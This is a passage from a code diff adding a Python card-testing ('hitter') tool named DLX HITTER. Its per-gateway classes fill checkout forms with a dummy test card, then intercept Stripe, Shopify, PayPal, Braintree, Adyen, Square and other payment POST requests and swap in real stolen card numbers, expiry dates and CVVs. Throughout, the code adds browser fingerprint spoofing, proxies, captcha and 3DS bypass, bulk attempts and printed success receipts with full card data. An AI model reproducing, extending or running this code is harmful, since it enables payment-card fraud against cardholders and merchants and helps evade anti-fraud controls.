+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= CHECKOUT.COM AUTOFILL =============
+class CheckoutComAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        'input[data-frames="card-number"]', '#card-number', 'input[name="cardNumber"]',
+        'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
+        '[data-testid="card-number"]', '#payment-card-number'
+    ]
+    EXPIRY_SELECTORS = [
+        'input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]',
+        'input[placeholder*="MM/YY"]', 'input[placeholder*="MM / YY"]',
+        '[data-testid="expiry-date"]'
+    ]
+    CVC_SELECTORS = [
+        'input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]',
+        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
+        '[data-testid="cvv"]'
+    ]
+    NAME_SELECTORS = [
+        'input[data-frames="name"]', '#name', 'input[name="name"]',
+        'input[placeholder*="Name on card"]', '[data-testid="cardholder-name"]'
+    ]
+    EMAIL_SELECTORS = [
+        'input[type="email"]', '#email', 'input[name="email"]',
+        'input[placeholder*="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
+        'button:has-text("Pay")', 'button:has-text("Submit")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and ("checkout.com" in request.url or "api.checkout.com" in request.url):
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
+                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
+                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
+                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= SHOPIFY AUTOFILL =============
+class ShopifyAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        '#number', 'input[name="number"]', '[autocomplete="cc-number"]',
+        'input[aria-label="Card number"]', '[data-testid="card-number"]',
+        'input[placeholder*="Card number"]', '.card-number'
+    ]
+    EXPIRY_SELECTORS = [
+        '#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
+        'input[aria-label="Expiry date"]', '[data-testid="expiry-date"]',
+        'input[placeholder*="MM/YY"]', '.expiry-date'
+    ]
+    CVC_SELECTORS = [
+        '#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]',
+        'input[aria-label="Security code"]', '[data-testid="security-code"]',
+        'input[placeholder*="CVC"]', '.cvv'
+    ]
+    NAME_SELECTORS = [
+        '#name', 'input[name="name"]', '[autocomplete="cc-name"]',
+        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
+    ]
+    EMAIL_SELECTORS = [
+        '#email', 'input[name="email"]', 'input[type="email"]',
+        'input[aria-label="Email"]', '[data-testid="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
+        'button:has-text("Pay")', 'button:has-text("Complete order")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and ("shopify.com" in request.url or "myshopify.com" in request.url or "stripe.com" in request.url):
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
+                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
+                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
+                    post_data = re.sub(r'credit_card\[month\]=01', f'credit_card[month]={self.real_card["month"]}', post_data)
+                    post_data = re.sub(r'credit_card\[year\]=30', f'credit_card[year]={self.real_card["year"]}', post_data)
+                    post_data = re.sub(r'credit_card\[verification_value\]=123', f'credit_card[verification_value]={self.real_card["cvv"]}', post_data)
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= PAYPAL AUTOFILL =============
+class PayPalAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        '#card-number', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
+        'input[aria-label="Card number"]', '[data-testid="card-number"]',
+        'input[placeholder*="Card number"]'
+    ]
+    EXPIRY_SELECTORS = [
+        '#exp-date', 'input[name="expDate"]', '[autocomplete="cc-exp"]',
+        'input[aria-label="Expiration date"]', '[data-testid="expiry-date"]',
+        'input[placeholder*="MM/YY"]'
+    ]
+    CVC_SELECTORS = [
+        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
+        'input[aria-label="Security code"]', '[data-testid="cvv"]',
+        'input[placeholder*="CVC"]'
+    ]
+    NAME_SELECTORS = [
+        '#cardholder-name', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
+        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
+    ]
+    EMAIL_SELECTORS = [
+        '#email', 'input[name="email"]', 'input[type="email"]',
+        'input[aria-label="Email"]', '[data-testid="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
+        'button:has-text("Pay Now")', 'button:has-text("Pay")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and ("paypal.com" in request.url or "braintreegateway.com" in request.url):
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
+                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= BRAINTREE AUTOFILL =============
+class BraintreeAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        'input[data-braintree-name="number"]', '#credit-card-number',
+        'input[name="credit_card[number]"]', 'input[autocomplete="cc-number"]',
+        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
+    ]
+    EXPIRY_SELECTORS = [
+        'input[data-braintree-name="expiration_date"]', '#expiration-date',
+        'input[name="credit_card[expiration_date]"]', 'input[placeholder*="MM/YY"]',
+        'input[aria-label="Expiration date"]'
+    ]
+    CVC_SELECTORS = [
+        'input[data-braintree-name="cvv"]', '#cvv',
+        'input[name="credit_card[cvv]"]', 'input[placeholder*="CVC"]',
+        'input[aria-label="Security code"]'
+    ]
+    NAME_SELECTORS = [
+        'input[data-braintree-name="cardholder_name"]', '#cardholder-name',
+        'input[name="credit_card[cardholder_name]"]', 'input[autocomplete="cc-name"]',
+        'input[placeholder*="Name on card"]'
+    ]
+    EMAIL_SELECTORS = [
+        'input[type="email"]', '#email', 'input[name="email"]',
+        'input[placeholder*="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
+        'button:has-text("Pay")', 'button:has-text("Submit")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and ("braintreegateway.com" in request.url or "braintree" in request.url):
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY, f"{self.real_card['month']}/{self.real_card['year']}")
+                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= ADYEN AUTOFILL =============
+class AdyenAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        '#cardNumber', 'input[name="cardNumber"]', '[data-cse="number"]',
+        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
+        '.card-number-input'
+    ]
+    EXPIRY_SELECTORS = [
+        '#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]',
+        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
+        '.expiry-date-input'
+    ]
+    CVC_SELECTORS = [
+        '#cvc', 'input[name="cvc"]', '[data-cse="cvc"]',
+        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
+        '.cvc-input'
+    ]
+    NAME_SELECTORS = [
+        '#cardholderName', 'input[name="cardholderName"]', '[data-cse="holderName"]',
+        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
+    ]
+    EMAIL_SELECTORS = [
+        'input[type="email"]', '#email', 'input[name="email"]',
+        'input[placeholder*="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '.adyen-checkout__button', '[data-testid="pay-button"]',
+        'button:has-text("Pay")', 'button:has-text("Submit")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and ("adyen.com" in request.url or "checkoutshopper" in request.url):
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
+                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
+                    post_data = re.sub(r'"cvc":"123"', f'"cvc":"{self.real_card["cvv"]}"', post_data)
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= SQUARE AUTOFILL =============
+class SquareAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        'input[name="card_number"]', '#card-number', '[autocomplete="cc-number"]',
+        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
+        '.sq-card-number'
+    ]
+    EXPIRY_SELECTORS = [
+        'input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]',
+        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiration date"]',
+        '.sq-expiration-date'
+    ]
+    CVC_SELECTORS = [
+        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
+        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
+        '.sq-cvv'
+    ]
+    NAME_SELECTORS = [
+        'input[name="cardholder_name"]', '#cardholder-name', '[autocomplete="cc-name"]',
+        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
+    ]
+    EMAIL_SELECTORS = [
+        'input[type="email"]', '#email', 'input[name="email"]',
+        'input[placeholder*="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
+        'button:has-text("Pay")', 'button:has-text("Submit")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and ("squareup.com" in request.url or "square" in request.url):
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = re.sub(r'card_number=4242424242424242', f'card_number={self.real_card["card"]}', post_data)
+                    post_data = re.sub(r'expiration_date=01%2F30', f'expiration_date={self.real_card["month"]}%2F{self.real_card["year"]}', post_data)
+                    post_data = re.sub(r'cvv=123', f'cvv={self.real_card["cvv"]}', post_data)
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= GENERIC AUTOFILL (Mollie, Klarna, AuthNet, WooCommerce, BigCommerce, Wix, Ecwid) =============
+class GenericAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        '#cardNumber', 'input[name="cardNumber"]', '#card-number', 'input[name="card_number"]',
+        'input[name="x_card_num"]', '[autocomplete="cc-number"]',
+        'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
+        '#wc-stripe-card-number', '.card-number'
+    ]
+    EXPIRY_SELECTORS = [
+        '#expiryDate', 'input[name="expiryDate"]', '#expiry-date', 'input[name="expiry"]',
+        'input[name="x_exp_date"]', '[autocomplete="cc-exp"]',
+        'input[placeholder*="MM/YY"]', 'input[aria-label*="Expiry"]',
+        '#wc-stripe-expiry', '.expiry-date'
+    ]
+    CVC_SELECTORS = [
+        '#cvv', 'input[name="cvv"]', 'input[name="x_card_code"]', '[autocomplete="cc-csc"]',
+        'input[placeholder*="CVC"]', 'input[aria-label*="Security"]',
+        '#wc-stripe-cvc', '.cvc'
+    ]
+    NAME_SELECTORS = [
+        '#cardholderName', 'input[name="cardholderName"]', 'input[name="x_card_name"]',
+        '[autocomplete="cc-name"]', 'input[placeholder*="Name on card"]'
+    ]
+    EMAIL_SELECTORS = [
+        'input[type="email"]', '#email', 'input[name="email"]',
+        '#billing_email', 'input[placeholder*="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
+        '#place_order', 'button:has-text("Pay")', 'button:has-text("Submit")',
+        'button:has-text("Place order")'
+    ]
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST":
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
+                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
+                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= PROVIDER -> AUTOFILL MAP =============
+AUTOFILL_MAP = {
+    'stripe': StripeAutofill,
+    'checkoutcom': CheckoutComAutofill,
+    'shopify': ShopifyAutofill,
+    'paypal': PayPalAutofill,
+    'braintree': BraintreeAutofill,
+    'adyen': AdyenAutofill,
+    'square': SquareAutofill,
+    'mollie': GenericAutofill,
+    'klarna': GenericAutofill,
+    'authorizenet': GenericAutofill,
+    'woocommerce': GenericAutofill,
+    'bigcommerce': GenericAutofill,
+    'wix': GenericAutofill,
+    'ecwid': GenericAutofill,
+}
+
+# ============= HITTER ENGINE =============
+class HitterEngine:
+    def __init__(self, proxy: Optional[str] = None):
+        self.results = []
+        self.successes = 0
+        self.fails = 0
+        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+        self.rate_limiter = SmartRateLimiter()
+        self.proxy = proxy
+
+    async def hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> Dict:
+        async with self.semaphore:
+            return await self._single_hit(url, card, merchant, product, amount, attempt_num)
+
+    async def _single_hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> Dict:
+        start_time = time.time()
+        result = {
+            'attempt': attempt_num,
+            'card': card,
+            'success': False,
+            'decline_code': None,
+            'receipt_url': None,
+            'response_time': 0
+        }
+
+        try:
+            async with async_playwright() as p:
+                fingerprint = FingerprintGenerator.generate()
+
+                launch_args = ['--disable-blink-features=AutomationControlled', '--no-sandbox']
+                if self.proxy:
+                    launch_args.append(f'--proxy-server={self.proxy}')
+
+                browser = await p.chromium.launch(headless=True, args=launch_args)
+
+                context_options = {
+                    'user_agent': fingerprint['user_agent'],
+                    'viewport': fingerprint['viewport'],
+                    'locale': fingerprint['locale'],
+                    'timezone_id': fingerprint['timezone_id'],
+                    'ignore_https_errors': True
+                }
+
+                browser_context = await browser.new_context(**context_options)
+                page = await browser_context.new_page()
+
+                await page.add_init_script(FingerprintGenerator.get_stealth_script())
+                await page.goto(url, timeout=60000, wait_until='domcontentloaded')
+                await asyncio.sleep(3)
+
+                provider = detect_provider(url, await page.content())
+                autofill_class = AUTOFILL_MAP.get(provider, GenericAutofill)
+
+                autofill = autofill_class(page)
+                await autofill.handle_captcha()
+                await autofill.enable_card_replace(card)
+                await autofill.fill_card(card)
+
+                submitted = await autofill.submit()
+                if not submitted:
+                    result['error'] = 'Submit button not found'
+                    await browser.close()
+                    return result
+
+                await asyncio.sleep(5)
+
+                if await autofill.wait_for_3ds(10000):
+                    await autofill.auto_complete_3ds()
+                    await asyncio.sleep(5)
+
+                await autofill.handle_captcha()
+
+                current_url = page.url
+                result['response_time'] = time.time() - start_time
+
+                if any(k in current_url.lower() for k in ['receipt', 'thank_you', 'success', 'order_confirmation', 'complete']):
+                    result['success'] = True
+                    result['receipt_url'] = current_url
+                    self.successes += 1
+                else:
+                    error_text = await page.text_content('body')
+                    if 'declined' in error_text.lower():
+                        result['decline_code'] = 'card_declined'
+                    else:
+                        result['decline_code'] = 'unknown'
+                    self.fails += 1
+
+                await browser.close()
+
+        except Exception as e:
+            result['error'] = str(e)
+            result['decline_code'] = 'exception'
+
+        self.results.append(result)
+        return result
+
+# ============= TERMINAL UI =============
+def print_url_info(info: Dict):
+    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
+    print(f"{Colors.BOLD}{'📋 URL ANALYSIS RESULTS'.center(70)}{Colors.END}")
+    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
+    print(f"{Colors.YELLOW}🔗 Checkout URL:{Colors.END} {info['url'][:80]}...")
+    print(f"{Colors.YELLOW}🏢 Merchant:{Colors.END} {Colors.GREEN}{info['merchant']}{Colors.END}")
+    if info['product'] != 'Unknown':
+        print(f"{Colors.YELLOW}📦 Product:{Colors.END} {Colors.CYAN}{info['product']}{Colors.END}")
+    if info['product_url']:
+        print(f"{Colors.YELLOW}🔗 Product URL:{Colors.END} {Colors.BLUE}{info['product_url']}{Colors.END}")
+    if info['amount']:
+        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {Colors.GREEN}{info['amount']} {info.get('currency', 'USD')}{Colors.END}")
+    else:
+        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {Colors.RED}Could not determine (JS loaded){Colors.END}")
+    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
+
+def print_header():
+    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
+    print(f"{Colors.BOLD}{'DLX HITTER - Active Session'.center(70)}{Colors.END}")
+    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
+
+def print_progress(current: int, total: int, successes: int, fails: int):
+    percent = (current / total) * 100
+    bar_length = 40
+    filled = int(bar_length * current / total)
+    bar = '█' * filled + '░' * (bar_length - filled)
+    print(f"\r{Colors.YELLOW}[{bar}]{Colors.END} {percent:.1f}% "
+          f"{Colors.GREEN}✓{successes}{Colors.END}/{Colors.RED}✗{fails}{Colors.END} "
+          f"({current}/{total})", end='', flush=True)
+
+def print_success(card: Dict, merchant: str, product: str, amount: str, receipt_url: str, response_time: float):
+    print(f"\n\n{Colors.GREEN}{'='*70}{Colors.END}")
+    print(f"{Colors.GREEN}{'🎉' * 10} SUCCESSFUL CHARGE! {'🎉' * 10}{Colors.END}")
+    print(f"{Colors.GREEN}{'='*70}{Colors.END}")
+    print(f"{Colors.CYAN}💳 Card:{Colors.END} {card['card']}|{card['month']}|{card['year']}|{card['cvv']}")
+    print(f"{Colors.CYAN}🏢 Merchant:{Colors.END} {merchant}")
+    if product != 'Unknown':
+        print(f"{Colors.CYAN}📦 Product:{Colors.END} {product}")
+    if amount:
+        print(f"{Colors.CYAN}💰 Amount:{Colors.END} {amount}")
+    print(f"{Colors.CYAN}⏱️ Response:{Colors.END} {response_time:.2f}s")
+    print(f"{Colors.CYAN}🔗 Receipt:{Colors.END} {Colors.GREEN}{receipt_url}{Colors.END}")
+    print(f"{Colors.GREEN}{'='*70}{Colors.END}\n")
+
+def print_decline(card: Dict, decline_code: str, response_time: float, attempt: int):
+    print(f"\n{Colors.RED}[✗] ATTEMPT #{attempt} DECLINED{Colors.END}")
+    print(f"    {Colors.YELLOW}💳 Card:{Colors.END} {card['card']}|{card['month']}|{card['year']}|{card['cvv']}")
+    print(f"    {Colors.YELLOW}📉 Reason:{Colors.END} {decline_code}")
+    print(f"    {Colors.YELLOW}⏱️ Time:{Colors.END} {response_time:.2f}s")
+
+def print_final_stats(successes: int, fails: int, total_time: float, url_info: Dict):
+    total = successes + fails
+    success_rate = (successes / total * 100) if total > 0 else 0
+    print(f"\n\n{Colors.CYAN}{'='*70}{Colors.END}")
+    print(f"{Colors.BOLD}{'🎯 FINAL STATISTICS 🎯'.center(70)}{Colors.END}")
+    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
+    print(f"{Colors.YELLOW}🏢 Merchant:{Colors.END} {url_info['merchant']}")
+    if url_info['product'] != 'Unknown':
+        print(f"{Colors.YELLOW}📦 Product:{Colors.END} {url_info['product']}")
+    if url_info['amount']:
+        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {url_info['amount']} {url_info.get('currency', 'USD')}")
+    print(f"{Colors.CYAN}{'-'*70}{Colors.END}")
+    print(f"{Colors.GREEN}✓ Successful:{Colors.END} {successes}")
+    print(f"{Colors.RED}✗ Failed:{Colors.END} {fails}")
+    print(f"{Colors.YELLOW}📊 Success Rate:{Colors.END} {success_rate:.1f}%")
+    print(f"{Colors.YELLOW}⏱️ Total Time:{Colors.END} {total_time:.2f}s")
+    if total > 0:
+        print(f"{Colors.YELLOW}⚡ Avg Time:{Colors.END} {total_time/total:.2f}s")
+    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
+
+# ============= MAIN APPLICATION (CLI) =============
+class DLXHitter:
+    def __init__(self):
+        self.url = None
+        self.url_info = None
+        self.cards = []
+        self.pattern_learner = CardPatternLearner()
+        self.engine = HitterEngine()
+        self.rate_limiter = SmartRateLimiter()
+
+    def get_url_and_analyze(self):
+        print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
+        print(f"{Colors.BOLD}{'📌 STEP 1: ENTER CHECKOUT URL'.center(50)}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*50}{Colors.END}")
+        self.url = input(f"{Colors.WHITE}🔗 URL: {Colors.END}").strip()
+
+        print(f"\n{Colors.YELLOW}[!] Analyzing URL...{Colors.END}")
+        try:
+            headers = {'User-Agent': random.choice(USER_AGENTS)}
+            resp = requests.get(self.url, timeout=15, verify=False, headers=headers, allow_redirects=True)
+            if resp.status_code == 200:
+                html = resp.text
+                merchant = URLAnalyzer.extract_merchant(html)
+                product = URLAnalyzer.extract_product_name(html)
+                amount = URLAnalyzer.extract_amount(html)
+                if merchant != 'Unknown' and product not in [None, 'Stripe Checkout', 'Checkout', 'Shopify Checkout']:
+                    self.url_info = {
+                        'url': self.url,
+                        'merchant': merchant,
+                        'product': product or 'Unknown',
+                        'product_url': URLAnalyzer.extract_product_url(html),
+                        'amount': amount,
+                        'currency': URLAnalyzer.extract_currency(html),
+                        'success': True
+                    }
+                    print_url_info(self.url_info)
+                    return
+        except Exception:
+            pass
+
+        print(f"{Colors.YELLOW}[!] Static analysis incomplete.{Colors.END}")
+        print(f"{Colors.YELLOW}[?] Perform deep analysis with Playwright? (y/n): {Colors.END}", end='')
+        choice = input().strip().lower()
+        if choice == 'y':
+            print(f"{Colors.CYAN}[!] Performing deep analysis...{Colors.END}")
